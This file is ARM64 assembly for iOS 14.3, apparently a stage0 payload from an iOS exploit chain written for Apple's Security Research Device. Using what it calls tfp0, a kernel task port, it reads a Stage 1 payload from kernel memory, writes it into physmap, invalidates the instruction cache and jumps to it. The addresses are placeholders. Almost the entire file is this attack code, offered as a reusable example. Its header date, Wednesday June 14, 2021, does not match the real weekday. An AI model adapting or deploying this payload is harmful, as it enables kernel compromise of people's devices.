; xcrun -sdk iphoneos clang -g -O2  -mios-version-min=14.3 -DDEBUG=0  -Wall -Wpedantic -Wno-gnu -Werror -Wunused-variable -o o.out stage0.s
; Hand Rolled by David Hoyt | SRD0009 | @h02332 for Apple Security Research Device on Wednesday June 14, 2021
; EDIT - This is an example.. you should recognize Code :-)
; Your Mileage May Vary
;
	.section	__TEXT,__text,regular,pure_instructions
	.build_version ios, 14, 0	sdk_version 14, 3
; 
;.ptrauth_abi_version 0
	; .build_version ios, 14, 0	sdk_version 14, 0
	.globl	_main                          ; -- Begin function main entry point
	.p2align	4
_main: 
  ; save signal return context:
  mov x20, x4
 
  ; save signal return token:
  mov x21, x5
 
  ; retrieve tfp0
  sub sp, sp, #0x10
  ldr w0, task_self_name
  mov w1, #7 ; TASK_SEATBELT_PORT
  mov x2, sp
  ldr x8, task_get_special_port
  blr x8
  ldr w19, [sp] ; tfp0!
 
  ; read Stage 1 into userspace
  mov w0, w19
  ldr x1, stage1_kaddr
  ldr w2, stage1_size
  mov x3, sp
  add x4, sp, #0x08
  ldr x8, mach_vm_read
  blr x8
 
  ; write Stage 1 into physmap
  mov w0, w19
  ldr x1, stage1_physmap_kaddr
  ldp x2, x3, [sp]
  ldr x8, mach_vm_write
  blr x8
  
  ldr x0, stage1_uaddr
  mov w1, #0x4000
  ldr x8, sys_icache_invalidate
  blr x8 
  
  ; jump to Stage 1
  mov w0, w19 ; tfp0
  mov x1, x20 ; sigreturn context
  mov x2, x21 ; sigretun token
 
  ldr x8, stage1_uaddr
  blr x8
 
task_self_name:
.word 0x49494949   
stage1_size:
.word 0x43434343
stage1_kaddr:
.quad 0x4141414141414141
mach_vm_read:
.quad 0x4242424242424242
stage1_physmap_kaddr:
.quad 0x4646464646464646
mach_vm_write:
.quad 0x4747474747474747
task_get_special_port:
.quad 0x4848484848484848
sys_icache_invalidate:
.quad 0x4b4b4b4b4b4b4b4b
stage1_uaddr:
.quad 0x4a4a4a4a4a4a4a4a
